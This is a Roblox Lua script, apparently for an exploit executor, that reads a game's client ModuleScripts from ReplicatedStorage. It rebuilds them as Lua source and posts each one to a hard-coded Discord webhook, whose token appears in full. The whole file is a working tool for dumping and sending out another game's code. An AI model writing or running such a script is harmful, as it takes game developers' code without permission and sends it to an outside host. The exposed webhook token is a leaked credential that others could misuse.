-- | load library | --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local ClientLibrary = Library:WaitForChild("Client")
local Modules = Library:WaitForChild("Modules")
local Types = Library:WaitForChild("Types")

-- | shared modules | --
local Network = require(ClientLibrary.Network)
--settings

local debug = true
local url = "https://discord.com/api/webhooks/1190677232616747028/kFukOVoJQPYY72B8G8SuoRIkN4m1LKsP0f7vg9rsjmbMykEm2tQqjIw3N1QZYbsbyYLx"

function tableToString(tbl, indent)
	indent = indent or 0
	local str = "{\n"

	for k, v in pairs(tbl) do
		local formatting = string.rep("    ", indent)
		local keyString
		if type(k) == "number" then
			keyString = "[" .. tostring(k) .. "]"
		else
			keyString = '["' .. tostring(k) .. '"]'
		end

		local valueString
		if type(v) == "table" then
			local metatable = getmetatable(v)
			valueString = metatable and metatable.__tostring and tostring(v) or tableToString(v, indent + 1)
		elseif type(v) == "function" then
			valueString = "function()\n\nend"
		elseif typeof(v) == "Vector3" then
			valueString = "Vector3.new(" .. v.X .. ", " .. v.Y .. ", " .. v.Z .. ")"
		elseif typeof(v) == "Vector2" then
			valueString = "Vector2.new(" .. v.X .. ", " .. v.Y .. ")"
		elseif typeof(v) == "UDim2" then
			valueString = "UDim2.new(" .. v.X.Scale .. ", " .. v.X.Offset .. ", " .. v.Y.Scale .. ", " .. v.Y.Offset .. ")"
		elseif typeof(v) == "UDim" then
			valueString = "UDim.new(" .. v.Scale .. ", " .. v.Offset .. ")"
		elseif typeof(v) == "CFrame" then
			local components = {v:GetComponents()}
			valueString = "CFrame.new(" .. table.concat(components, ", ") .. ")"
		elseif typeof(v) == "Color3" then
			valueString = "Color3.new(" .. v.R .. ", " .. v.G .. ", " .. v.B .. ")"
		elseif typeof(v) == "Instance" then
 			local path = v.Name
			local parent = v.Parent
			while parent do
				path = parent.Name .. "." .. path
				parent = parent.Parent
			end
			
			valueString = path
		elseif type(v) == "string" then
			valueString = '"' .. v .. '"'
		elseif type(v) == "number" then
			valueString = tostring(v)
		elseif type(v) == "boolean" then
			valueString = tostring(v)	
		elseif tostring(v) == "inf" and v == math.huge then
			valueString = "math.huge"
		else
			valueString = "nil --[[ Failed to get type: "..typeof(v).." ]]"
		end

		str = str .. formatting .. keyString .. " = " .. valueString .. ",\n"
	end

	str = str .. string.rep("    ", indent - 1) .. "}"
	return str
end

function extract(module)
	local data = require(module)
	assert(data)

	local source = [[
-- Path: %s

return %s
	]]

	return string.format(source, module:GetFullName(), tableToString(data))
end

function getParents(o,d)
	d = d or 1

	local parents = ""
	local newest = o
	for i = 1,d do
		parents = parents.."."..newest.Name
		newest = newest.Parent
	end
	return parents
end


function decompile(object, extractDesendants, timeout)
timeout = timeout or 10
	if extractDesendants then
		local function decompileDesendants(parent, de)
			for _,module in ipairs(parent:GetChildren()) do
				if module.ClassName == "Folder" or module:FindFirstChildOfClass("ModuleScript") then
					decompileDesendants(module, de + 1)
					continue
				end

				if module.ClassName ~= "ModuleScript" then
					continue
				end

				local source = extract(module)
				if not source then
					if debug then
						print("NO SOURCE _ "..tostring(module.Name)..getParents(module,de))
					end

					continue
				end

				--setclipboard(source)
	            SendMessage(url, "\n```lua\n"..source.."```")
				
				if debug then
					print("DECOMPILED _ "..tostring(module.Name)..getParents(module,de))
				end

				task.wait(timeout)
			end
		end

		decompileDesendants(object, 1)

		warn("DONE!")
		return
	end

	local source = extract(object)
	if not source then
		if debug then
			print("NO SOURCE _ "..tostring(object.Name))
		end

		return
	end

	--setclipboard(source)
	SendMessage(url, "\n```lua\n"..source.."```")

	if debug then
		print("DECOMPILED _ "..tostring(object.Name))
	end
	warn("DONE!")
end

function SendMessage(url, message)
	local http = game:GetService("HttpService")
	local headers = {
		["Content-Type"] = "application/json"
	}
	local data = {
		["content"] = message
	}
	local body = http:JSONEncode(data)
	local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end



return decompile

